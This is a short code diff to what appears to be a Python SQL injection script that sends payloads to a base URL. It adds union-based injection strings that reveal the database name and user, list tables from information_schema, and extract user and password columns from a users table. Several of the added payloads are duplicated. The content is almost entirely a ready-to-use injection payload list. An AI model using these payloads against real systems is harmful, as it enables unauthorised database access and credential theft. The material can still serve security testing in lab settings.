@@ -51,10 +51,16 @@ def main():
     args = parse_args()
     base_url = args.base_url
     payloads = [
-        #"test",
         "1'",
         "1' and 1=1#",
         "1' and 1=1 union select database(), user()#",
+        "1' and 1=1 union select null, table_name from information_schema.tables#",
+        "1' and 1=1 union select user, password from users#",
+        "1'",
+        "1' and 1=1#",
+        "1' and 1=1 union select database(), user()#",
+        "1' and 1=1 union select null, table_name from information_schema.tables#",
+        "1' and 1=1 union select user, password from users#",
         "1' and 1=1 union select null, table_name from information_schema.tables#",
         "1' and 1=1 union select user, password from users#"
     ]
